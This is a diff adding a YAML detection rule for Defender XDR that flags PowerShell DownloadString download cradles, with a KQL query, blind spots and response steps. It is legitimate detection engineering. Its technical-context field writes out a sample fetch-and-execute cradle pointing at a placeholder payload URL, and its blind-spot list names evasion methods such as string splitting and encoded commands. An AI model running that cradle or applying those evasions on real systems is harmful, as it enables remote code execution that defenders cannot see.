@@ -1,0 +1,104 @@
+# Copied from https://github.com/oluwatosinogunjimi/KQL-Query/blob/main/detections/execution/powershell-downloadstring.md
+# The site reads only this file. Edit it here by hand, or re-run tools/import_detections.py.
+id: powershell-downloadstring
+title: PowerShell DownloadString Remote Execution
+tactic: Execution
+technique: 'Command and Scripting Interpreter: PowerShell'
+technique_ids:
+- T1059.001
+severity: High
+severity_why: A download cradle into memory is a high-value execution signal; legitimate uses are few and usually attributable to known admin tooling.
+goal: Catch PowerShell pulling a script or payload straight into memory from a URL with `DownloadString()`, the classic download cradle for fileless execution.
+description: Detects use of PowerShell's `DownloadString()` method to download content from a remote URL directly into memory, bypassing the filesystem entirely. When combined with `Invoke-Expression` (IEX), this creates a fileless execution chain where a remote script is downloaded and executed without ever touching disk — a technique commonly used in initial access, post-exploitation, and C2 stager delivery. Covers both the process command line (where the full command is visible) and PowerShell script block logging (where obfuscated or multi-stage scripts surface their decoded content). Known legitimate automation tools, cloud metadata endpoints, and package managers are excluded.
+strategy: Two branches unioned together. `DeviceProcessEvents` matches powershell.exe or pwsh.exe command lines containing `DownloadString` and `http`. `DeviceEvents` with ActionType `PowerShellCommand` matches the same strings in the PowerShell command telemetry, which surfaces commands that were obfuscated or encoded on the command line. Cloud metadata addresses and Chocolatey are excluded.
+technical_context: 'The typical cradle is `IEX (New-Object Net.WebClient).DownloadString(''http://…/payload.ps1'')`, launched by a macro, a shortcut (LNK) file, a web shell or an attacker''s interactive session. The parent process says a lot: an Office application or browser points to phishing, w3wp.exe points to a web shell, and a remote management tool points to hands-on-keyboard activity. A matching outbound connection in `DeviceNetworkEvents` shows whether the download succeeded.'
+blind_spots:
+- 'Other download methods: `Invoke-WebRequest` / `iwr`, `Invoke-RestMethod` / `irm`, `Net.WebClient.DownloadData` or `DownloadFile`, `Start-BitsTransfer`, and non-PowerShell tools such as certutil or curl.'
+- Obfuscation that splits the string on the command line (`'Down'+'loadString'`, backticks, character codes). The command-telemetry branch only catches it if the decoded command is recorded.
+- Base64-encoded commands (`-enc`) are only visible through the command-telemetry branch.
+- PowerShell hosted inside another process (powershell_ise.exe, custom runspaces loading System.Management.Automation.dll).
+- URLs without `http` (for example UNC paths or `ftp://`).
+- Assumes PowerShell command telemetry is reaching Defender XDR for the host.
+false_positives:
+- Administrator and deployment scripts that bootstrap from an internal web server.
+- Package managers and installers other than Chocolatey (for example Scoop, vendor install one-liners).
+- Monitoring or management agents that fetch configuration scripts on a schedule.
+frequency: Scheduled
+lookback: 4 hours
+kql: |
+  // Detect PowerShell DownloadString() method usage - commonly used to download and execute malicious scripts
+  // Covers both process creation command line and script block logging
+  // Excludes known legitimate automation tools and cloud metadata endpoints
+
+  union
+  (
+      DeviceProcessEvents
+      | where ActionType == "ProcessCreated"
+      | where FileName in~ ("powershell.exe", "pwsh.exe")
+      | where ProcessCommandLine contains "DownloadString"
+      | where ProcessCommandLine contains "http"
+      | where not (ProcessCommandLine has_any (dynamic(["168.63.129.16", "169.254.169.254", "chocolatey"])))
+      | project
+          DeviceId,
+          Timestamp,
+          ReportId,
+          DeviceName,
+          AccountName,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine,
+          FileName,
+          ProcessCommandLine,
+          EventType = "ProcessCreated"
+  ),
+  (
+      DeviceEvents
+      | where ActionType == "PowerShellCommand"
+      | where AdditionalFields has "DownloadString"
+      | where AdditionalFields has "http"
+      | where not (AdditionalFields has_any (dynamic(["168.63.129.16", "169.254.169.254"])))
+      | project
+          DeviceId,
+          Timestamp,
+          ReportId,
+          DeviceName,
+          AccountName = "",
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine,
+          FileName = "",
+          ProcessCommandLine = tostring(AdditionalFields),
+          EventType = "ScriptBlockLogging"
+  )
+  | order by Timestamp desc
+alert:
+  title: PowerShell DownloadString Detected on {{DeviceName}} via {{InitiatingProcessFileName}}
+  description: 'PowerShell''s DownloadString() method was detected initiated by {{InitiatingProcessFileName}}. Account: {{AccountName}}. Command: {{ProcessCommandLine}}'
+  custom_details:
+  - 'EventType: ProcessCreated / ScriptBlockLogging'
+  - 'CommandLine: ProcessCommandLine'
+  - 'ParentProcess: InitiatingProcessFileName'
+entity_mapping:
+  Account: AccountName
+  Host: DeviceName
+  File: FileName
+  Process: ProcessCommandLine
+validation:
+- date: '2026-09-15'
+  method: Atomic Red Team
+  environment: Windows test device, Defender XDR
+  result: Custom rule fired
+playbooks:
+- suspicious-powershell
+actions:
+- Review `ProcessCommandLine` or script block content immediately — extract the full URL and check it against threat intelligence; the domain and path often identify the malware family or C2 framework.
+- Check `InitiatingProcessFileName` — a document reader, browser, or email client parent confirms a phishing-initiated execution chain; `w3wp.exe` confirms web shell execution.
+- Search `DeviceNetworkEvents` on the same `DeviceId` around the same `Timestamp` for the outbound connection to determine whether the download succeeded.
+- If `EventType` is `ScriptBlockLogging`, correlate with `DeviceProcessEvents` on the same `DeviceId` for the full PowerShell execution context.
+- Hunt for `IEX` / `Invoke-Expression` in the same command line or script block — combined with `DownloadString`, this confirms fileless execution and should be treated as a confirmed incident pending further evidence.
+tuning:
+- date: '2026-03-25'
+  change: Initial version
+  reason: Baseline
+- date: '2026-09-15'
+  change: Added script block logging branch, exclusions for cloud metadata endpoints and package managers, tightened lookback to 4 hours, expanded recommended actions
+  reason: Validated in Defender XDR; reduce false positives and cover obfuscated/multi-stage execution
+source: https://github.com/oluwatosinogunjimi/KQL-Query/blob/main/detections/execution/powershell-downloadstring.md
